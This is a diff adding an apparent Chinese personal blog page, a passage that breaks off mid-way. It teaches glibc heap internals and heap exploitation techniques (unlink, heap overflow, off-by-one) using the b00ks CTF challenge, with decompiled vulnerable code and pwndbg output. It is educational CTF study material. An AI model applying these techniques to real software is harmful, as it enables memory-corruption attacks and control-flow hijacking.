@@ -1,0 +1,608 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/bitbug_favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/bitbug_favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"jonathanbest7.github.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="pwn2heap堆的基础知识我们现在在学的是在glibc下的堆–ptmalloc2。堆是由低地址向高地址增长的，管理堆的称为对管理器。 malloc调用底层原理，malloc通过创建堆的大小来选择，下图很经典:  通过brk申请内存，初始状态start_brk和brk指向同一地址，aslr开启会有不同效果  不开启 ASLR 保护时，start_brk 以及 brk 会指向 data&#x2F;b">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwn2heap">
+<meta property="og:url" content="https://jonathanbest7.github.io/2023/03/20/pwn2heap/index.html">
+<meta property="og:site_name" content="bj777的blog">
+<meta property="og:description" content="pwn2heap堆的基础知识我们现在在学的是在glibc下的堆–ptmalloc2。堆是由低地址向高地址增长的，管理堆的称为对管理器。 malloc调用底层原理，malloc通过创建堆的大小来选择，下图很经典:  通过brk申请内存，初始状态start_brk和brk指向同一地址，aslr开启会有不同效果  不开启 ASLR 保护时，start_brk 以及 brk 会指向 data&#x2F;b">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://jonathanbest7.github.io/Users/86159/AppData/Roaming/Typora/typora-user-images/image-20230328191402830.png">
+<meta property="og:image" content="https://jonathanbest7.github.io/Users/86159/AppData/Roaming/Typora/typora-user-images/image-20230328203217271.png">
+<meta property="og:image" content="https://jonathanbest7.github.io/Users/86159/AppData/Roaming/Typora/typora-user-images/image-20230328203741130.png">
+<meta property="og:image" content="https://jonathanbest7.github.io/Users/86159/AppData/Roaming/Typora/typora-user-images/image-20230330210801150.png">
+<meta property="og:image" content="https://jonathanbest7.github.io/Users/86159/AppData/Roaming/Typora/typora-user-images/image-20230331190125023.png">
+<meta property="article:published_time" content="2023-03-20T08:11:46.000Z">
+<meta property="article:modified_time" content="2023-04-04T03:18:11.071Z">
+<meta property="article:author" content="bj777">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://jonathanbest7.github.io/Users/86159/AppData/Roaming/Typora/typora-user-images/image-20230328191402830.png">
+
+<link rel="canonical" href="https://jonathanbest7.github.io/2023/03/20/pwn2heap/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>pwn2heap | bj777的blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">bj777的blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">记录学习每一瞬间</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">1</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">0</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">41</span></a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://jonathanbest7.github.io/2023/03/20/pwn2heap/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/bitbug_favicon.ico">
+      <meta itemprop="name" content="bj777">
+      <meta itemprop="description" content="一位逆向菜狗">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="bj777的blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          pwn2heap
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2023-03-20 16:11:46" itemprop="dateCreated datePublished" datetime="2023-03-20T16:11:46+08:00">2023-03-20</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-04-04 11:18:11" itemprop="dateModified" datetime="2023-04-04T11:18:11+08:00">2023-04-04</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="pwn2heap"><a href="#pwn2heap" class="headerlink" title="pwn2heap"></a>pwn2heap</h1><h2 id="堆的基础知识"><a href="#堆的基础知识" class="headerlink" title="堆的基础知识"></a>堆的基础知识</h2><p>我们现在在学的是在glibc下的堆–ptmalloc2。堆是由低地址向高地址增长的，管理堆的称为对管理器。</p>
+<p>malloc调用底层原理，malloc通过创建堆的大小来选择，下图很经典:</p>
+<p><img src="/../../../Users/86159/AppData/Roaming/Typora/typora-user-images/image-20230328191402830.png" alt="image-20230328191402830"></p>
+<p>通过brk申请内存，初始状态start_brk和brk指向同一地址，aslr开启会有不同效果</p>
+<ul>
+<li>不开启 ASLR 保护时，start_brk 以及 brk 会指向 data&#x2F;bss 段的结尾。</li>
+<li>开启 ASLR 保护时，start_brk 以及 brk 也会指向同一位置，只是这个位置是在 data&#x2F;bss 段结尾后的随机偏移处。</li>
+</ul>
+<p>通过mmap申请内存，用来申请大的空间。</p>
+<p>我们如果申请1000字节内存，但会得到很大的堆，是因为系统要向内核请示，这样会消耗许多系统资源，所以直接给一个很大的内存可以避免多次用户态和内核态切换，这段连续内存叫arena</p>
+<h2 id="堆的结构"><a href="#堆的结构" class="headerlink" title="堆的结构"></a>堆的结构</h2><h3 id="malloc-chunk"><a href="#malloc-chunk" class="headerlink" title="malloc_chunk"></a>malloc_chunk</h3><p>由malloc申请的内存叫chunk，这块内存在ptmalloc内部用malloc_chunk结构体表示，无论chunk大小如何，处于分配还是释放状态，都有统一结构。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk</span>;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span> <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">bk_nextsize</span>;</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<p> INTERNAL_SIZE_T 就是size_t 是无符号整数</p>
+<p>prev_size：如果该 chunk 的<strong>物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）</strong>是空闲的话，那该字段记录的是前一个chunck的大小（包括chunk头），否则该字段可以用来存储物理地址相邻的前一个chunk数据，前一个chunk指的是低地址的chunk。</p>
+<p>size：指当前chunck大小，必须是4或8的倍数，因为机子要么是32位要么是64位，地址必须要遵守上述规定，所以其2进制后三位一定为0，所以我们给他新的应用，从高往低依次表示：</p>
+<ul>
+<li>NON_MAIN_ARENA，记录当前 chunk 是否不属于主线程，1 表示不属于，0 表示属于。</li>
+<li>IS_MAPPED，记录当前 chunk 是否是由 mmap 分配的。</li>
+<li>PREV_INUSE，记录前一个 chunk 块是否被分配。一般来说，堆中第一个被分配的内存块的 size 字段的 P 位都会被设置为 1，以便于防止访问前面的非法内存。当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。这也方便进行空闲 chunk 之间的合并（如果前面的chunk没有free，该位为1）。</li>
+</ul>
+<p>fd，bk：chunk在分配状态时，fd字段开始是用户数据。chunk空闲时，会被添加到对应空闲管理链表中：</p>
+<ul>
+<li>fd 指向下一个（非物理相邻）空闲的 chunk</li>
+<li>bk 指向上一个（非物理相邻）空闲的 chunk</li>
+<li>通过 fd 和 bk 可以将空闲的 chunk 块加入到空闲的 chunk 块链表进行统一管理</li>
+</ul>
+<p>fd_nextsize，bk_nextsize：用于较大的chunk，用于空闲的chunk</p>
+<ul>
+<li>fd_nextsize 指向前一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li>
+<li>bk_nextsize 指向后一个与当前 chunk 大小不同的第一个空闲块，不包含 bin 的头指针。</li>
+<li>一般空闲的 large chunk 在 fd 的遍历顺序中，按照由大到小的顺序排列。<strong>这样做可以避免在寻找合适 chunk 时挨个遍历。</strong></li>
+</ul>
+<p>一个已经分配的 chunk 的样子如下。<strong>我们称前两个字段称为 chunk header，后面的部分称为 user data。每次 malloc 申请得到的内存指针，其实指向 user data 的起始处。</strong>（分配的内存地址和malloc赋予的指针地址其实不一样）</p>
+<p>当一个 chunk 处于使用状态时，它的下一个 chunk 的 prev_size 域无效，所以下一个 chunk 的该部分也可以被当前 chunk 使用。<strong>这就是 chunk 中的空间复用。</strong></p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             <span class="type">Size</span> of previous chunk, <span class="keyword">if</span> unallocated (P <span class="built_in">clear</span>)  |</span><br><span class="line">        <span class="type">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="type">        |             Size</span> of chunk, <span class="built_in">in</span> bytes                     |<span class="type">A</span>|<span class="type">M</span>|<span class="type">P</span>|</span><br><span class="line">  <span class="type">mem</span>-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             <span class="type">User</span> data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             (malloc_usable_size() bytes)                      .</span><br><span class="line">next    .                                                               |</span><br><span class="line"><span class="type">chunk</span>-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             <span class="type">(size</span> of chunk, but used <span class="keyword">for</span> application data)    |</span><br><span class="line">        <span class="type">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br><span class="line"><span class="type">        |             Size</span> of next chunk, <span class="built_in">in</span> bytes                |<span class="type">A</span>|<span class="type">0</span>|<span class="type">1</span>|</span><br><span class="line">        <span class="type">+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h3><p>被释放的堆并不会立刻消失，会由ptmalloc堆管理器管理，为了是当又需要chunk时能够立刻挑选一个合适的给用户。空闲的chunk会被分为4类：fast bins，small bins，large bins，unsorted bin。ptmalloc将这些维护在一个数组中，存放在malloc_state中</p>
+<p>数组中的 bin 依次如下</p>
+<ol>
+<li>第一个为 unsorted bin，字如其面，这里面的 chunk 没有进行排序，存储的 chunk 比较杂。</li>
+<li>索引从 2 到 63 的 bin 称为 small bin，同一个 small bin 链表中的 chunk 的大小相同。两个相邻索引的 small bin 链表中的 chunk 大小相差的字节数为 <strong>2 个机器字长</strong>，即 32 位相差 8 字节，64 位相差 16 字节。</li>
+<li>small bins 后面的 bin 被称作 large bins。large bins 中的每一个 bin 都包含一定范围内的 chunk，其中的 chunk 按 fd 指针的顺序从大到小排列。相同大小的 chunk 同样按照最近使用顺序排列。</li>
+</ol>
+<p>此外，上述这些 bin 的排布都会遵循一个原则：<strong>任意两个物理相邻的空闲 chunk 不能在一起</strong>。</p>
+<p>需要注意的是，并不是所有的 chunk 被释放后就立即被放到 bin 中。ptmalloc 为了提高分配的速度，会把一些小的 chunk <strong>先</strong>放到 fast bins 的容器内。<strong>而且，fastbin 容器中的 chunk 的使用标记总是被置位的，所以不满足上面的原则。</strong></p>
+<h4 id="fastbin（lifo）"><a href="#fastbin（lifo）" class="headerlink" title="fastbin（lifo）"></a>fastbin（lifo）</h4><p>为了不把时间花在合并和拆分堆内存上，fastbin被设计出来，glibc对fastbin中的每个bin进行单向链表组织，fastbin最大chunk空间是80字节，当需要小于80字节时，会先在fastbin里寻找有对应大小的空闲块。</p>
+<h4 id="smallbin（fifo）"><a href="#smallbin（fifo）" class="headerlink" title="smallbin（fifo）"></a>smallbin（fifo）</h4><p><img src="/../../../Users/86159/AppData/Roaming/Typora/typora-user-images/image-20230328203217271.png" alt="image-20230328203217271"></p>
+<p>smallbin是双向链表，共62个，每个链表存储chunk大小都一样。比如32位系统下标2对应链表chunk大小都是16字节</p>
+<h4 id="largebin"><a href="#largebin" class="headerlink" title="largebin"></a>largebin</h4><p>一共有63个bin，每个bin中chunk大小不同，处于一定区间范围内，这63个bin被分成6组，每组bin中chunk大小一致</p>
+<p><img src="/../../../Users/86159/AppData/Roaming/Typora/typora-user-images/image-20230328203741130.png" alt="image-20230328203741130"></p>
+<h4 id="unsortedbin（fifio）"><a href="#unsortedbin（fifio）" class="headerlink" title="unsortedbin（fifio）"></a>unsortedbin（fifio）</h4><p>是空闲chunk回归所属bin之前的缓冲区，unsortedbin只有一个链表，chunk处于乱序状态</p>
+<ul>
+<li>当一个较大的 chunk 被分割成两半后，如果剩下的部分大于 MINSIZE，就会被放到 unsorted bin 中。</li>
+<li>释放一个不属于 fast bin 的 chunk，并且该 chunk 不和 top chunk 紧邻时，该 chunk 会被首先放到 unsorted bin 中。</li>
+</ul>
+<h4 id="top-chunk"><a href="#top-chunk" class="headerlink" title="top chunk"></a>top chunk</h4><p>程序第一次malloc时，heap会被分成两块，一块给用户，一块就是topchunk，这个topchunk物理地址时最高的，它不属于任何一个bin，如果所有bin都满足不了用户需求，就从他这分走一块bin，剩余的做成新的topbchunk。</p>
+<p>初始情况可以把unsortedbin作为topchunk。</p>
+<h4 id="last-remainder"><a href="#last-remainder" class="headerlink" title="last remainder"></a>last remainder</h4><p>在用户使用 malloc 请求分配内存时，ptmalloc2 找到的 chunk 可能并不和申请的内存大小一致，这时候就将分割之后的剩余部分称之为 last remainder chunk ，unsort bin 也会存这一块。top chunk 分割剩下的部分不会作为 last remainder.</p>
+<h2 id="UNLINK"><a href="#UNLINK" class="headerlink" title="UNLINK"></a>UNLINK</h2><p>unlink是一个ptmalloc中的操作，为了将双向链表中的一个元素取出来</p>
+<p>如：</p>
+<p>1、malloc时需要从largebin中取出chunk，而fastbin和smallbin不使用unlink，依次遍历处理unsortedbin也不会用unlink，或者从比请求chunk所在bin打的bin中取chunk时</p>
+<p>2、free：向后合并，合并物理地址相邻的低地址空闲chunk；向前合并，合并物理地址相邻的高地址空闲chunk</p>
+<p>3、malloc_consolidate</p>
+<p>向后合并，合并物理地址相邻的低地址空闲chunk；向前合并，合并物理地址相邻的高地址空闲chunk</p>
+<p>4、realloc</p>
+<p>向前扩展，合并物理地址相邻高地址空闲chunk</p>
+<p>下图是经典的smallbin的unlink：</p>
+<p><img src="/../../../Users/86159/AppData/Roaming/Typora/typora-user-images/image-20230330210801150.png" alt="image-20230330210801150"></p>
+<h2 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h2><p>原理：溢出是指程序向某个堆块中写入的字节数超过了堆块本身可使用的字节数（<strong>之所以是可使用而不是用户申请的字节数，是因为堆管理器会对用户所申请的字节数进行调整，这也导致可利用的字节数都不小于用户申请的字节数</strong>），因而导致了数据溢出，并覆盖到<strong>物理相邻的高地址</strong>的下一个堆块。</p>
+<p>策略：</p>
+<ol>
+<li><p>覆盖与其</p>
+<p>物理相邻的下一个 chunk</p>
+<p>的内容。</p>
+<ul>
+<li>prev_size</li>
+<li>size，主要有三个比特位，以及该堆块真正的大小。<ul>
+<li>NON_MAIN_ARENA</li>
+<li>IS_MAPPED</li>
+<li>PREV_INUSE</li>
+<li>the True chunk size</li>
+</ul>
+</li>
+<li>chunk content，从而改变程序固有的执行流。</li>
+</ul>
+</li>
+<li><p>利用堆中的机制（如 unlink 等 ）来实现任意地址写入（ Write-Anything-Anywhere）或控制堆块中的内容等效果，从而来控制程序的执行流。</p>
+</li>
+</ol>
+<p>calloc与malloc区别就是calloc会在分配后自动清空</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">calloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="comment">//等同于</span></span><br><span class="line">ptr=<span class="built_in">malloc</span>(<span class="number">0x20</span>);</span><br><span class="line"><span class="built_in">memset</span>(ptr,<span class="number">0</span>,<span class="number">0x20</span>);</span><br></pre></td></tr></table></figure>
+
+<p>realloc</p>
+<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">当 <span class="built_in">realloc</span>(ptr,size) 的 size 不等于 ptr 的 size 时</span><br><span class="line">如果申请 size &gt; 原来 size</span><br><span class="line">如果 chunk 与 <span class="attribute">top</span> chunk 相邻，直接扩展这个 chunk 到新 size 大小</span><br><span class="line">如果 chunk 与 <span class="attribute">top</span> chunk 不相邻，相当于 <span class="built_in">free</span>(ptr),<span class="built_in">malloc</span>(new_size)</span><br><span class="line">如果申请 size &lt; 原来 size</span><br><span class="line">如果相差不足以容得下一个最小 <span class="built_in">chunk</span>(<span class="number">64</span> 位下 <span class="number">32</span> 个字节，<span class="number">32</span> 位下 <span class="number">16</span> 个字节)，则保持不变</span><br><span class="line">如果相差可以容得下一个最小 chunk，则切割原 chunk 为两部分，free 掉后一部分</span><br><span class="line">当 <span class="built_in">realloc</span>(ptr,size) 的 size 等于 <span class="number">0</span> 时，相当于 <span class="built_in">free</span>(ptr)</span><br><span class="line">当 <span class="built_in">realloc</span>(ptr,size) 的 size 等于 ptr 的 size，不进行任何操作</span><br></pre></td></tr></table></figure>
+
+<p>例题还没刷到</p>
+<h2 id="Off-By-One"><a href="#Off-By-One" class="headerlink" title="Off-By-One"></a>Off-By-One</h2><p>原理：off-by-one指的是单字节缓冲区溢出，漏洞与边界检查不严和字符串传递有关。</p>
+<p>利用思路：</p>
+<p>1、溢出字节位可控制任意字节：通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或者覆盖其他块数据。也可以使用NULL字节溢出方法。</p>
+<p>2、溢出字节为NULL字节：在size为0x100的时候，溢出NULL字节可以使得prev_in_use位被清除，这样前块会被认为是free块。（1）这时候可以选择unlink方法进行处理（2）另外prev_size就会启用，就可以伪造prev_size，从而造成块之间发生重叠。这个方法关键是unlink有没有检查按照prev_size找到的块的大小与prev_size是否一致。</p>
+<p>ps.2.28之前没有check方法2</p>
+<p>举一个例子，刚开始看真的不是很好理解：</p>
+<p>b00ks：</p>
+<p>这个程序有很多功能</p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> Create a book</span><br><span class="line"><span class="bullet">2.</span> Delete a book</span><br><span class="line"><span class="bullet">3.</span> Edit a book</span><br><span class="line"><span class="bullet">4.</span> Print book detail</span><br><span class="line"><span class="bullet">5.</span> Change current author name</span><br><span class="line"><span class="bullet">6.</span> Exit</span><br></pre></td></tr></table></figure>
+
+<p>书本的一个结构体大小是20字节</p>
+<figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> <span class="title class_">book</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="type">char</span> *name;</span><br><span class="line">    <span class="type">char</span> *description;</span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>作者名字可以修改，book结构体中的description可以修改，这两处修改函数都是有offbyone漏洞的</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 __fastcall <span class="title function_">my_read</span><span class="params">(_BYTE *ptr, <span class="type">int</span> number)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  _BYTE *buf; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( number &lt;= <span class="number">0</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  buf = ptr;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)read(<span class="number">0</span>, buf, <span class="number">1uLL</span>) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *buf == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    ++buf;</span><br><span class="line">    <span class="keyword">if</span> ( i == number )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *buf = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>首先输入作者名后可以搜索到存放地址：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; search -s flag</span><br><span class="line">b00ks           <span class="number">0x555555602040</span> <span class="number">0x67616c66</span> /* <span class="string">&#x27;flag&#x27;</span> */</span><br><span class="line">libc-<span class="number">2.31</span>.so    <span class="number">0x7ffff7dd938b</span> <span class="number">0x5f5f007367616c66</span> /* <span class="string">&#x27;flags&#x27;</span> */</span><br><span class="line">libc-<span class="number">2.31</span>.so    <span class="number">0x7ffff7ddbf01</span> <span class="number">0x5f5f007367616c66</span> /* <span class="string">&#x27;flags&#x27;</span> */</span><br><span class="line">libc-<span class="number">2.31</span>.so    <span class="number">0x7ffff7ddc336</span> <span class="number">0x7563007367616c66</span> /* <span class="string">&#x27;flags&#x27;</span> */</span><br><span class="line">libc-<span class="number">2.31</span>.so    <span class="number">0x7ffff7f77de0</span> <span class="number">0x6f4e007367616c66</span> /* <span class="string">&#x27;flags&#x27;</span> */</span><br><span class="line">libc-<span class="number">2.31</span>.so    <span class="number">0x7ffff7f7ec06</span> <span class="string">&#x27;flags &amp; PRINTF_FORTIFY) != 0&#x27;</span></span><br><span class="line">ld-<span class="number">2.31</span>.so      <span class="number">0x7ffff7ff5213</span> <span class="number">0x642f002967616c66</span> /* <span class="string">&#x27;flag)&#x27;</span> */</span><br><span class="line">ld-<span class="number">2.31</span>.so      <span class="number">0x7ffff7ff5d3e</span> <span class="string">&#x27;flag value(s) of 0x%x in DT_FLAGS_1.\\n&#x27;</span></span><br><span class="line">ld-<span class="number">2.31</span>.so      <span class="number">0x7ffff7ff6745</span> <span class="string">&#x27;flags &amp; DL_LOOKUP_RETURN_NEWEST)&#x27;</span></span><br><span class="line">pwndbg&gt; x/20xg <span class="number">0x555555602040</span>//打印地址</span><br><span class="line"><span class="number">0x555555602040</span>:	<span class="number">0x0000000067616c66</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555602050</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x555555602060</span>:	<span class="number">0x00005555556036f0</span>	<span 